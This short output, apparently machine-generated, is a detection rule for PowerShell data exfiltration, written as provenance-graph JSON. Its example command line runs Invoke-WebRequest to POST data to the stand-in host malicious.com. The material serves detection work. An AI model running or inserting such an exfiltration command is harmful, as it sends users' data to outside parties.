<output>
1. **Identify Data Exfiltration via PowerShell**  
   - Monitor for events where the `srcNode` is a PowerShell process.  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Ensure the `dstNode` indicates a network connection to an external server (e.g., `Dstaddress` is "http://malicious.com").  
   - Validate that the `Cmdline` of the `srcNode` contains the command `Invoke-WebRequest` with parameters indicating data is being sent (e.g., `-Method POST` and `-Body $data`).  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/exfil -Method POST -Body $data",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "http://malicious.com",
         "Type": "Network"
       },
       "relation": "Process Create"
     }
     ```
</output>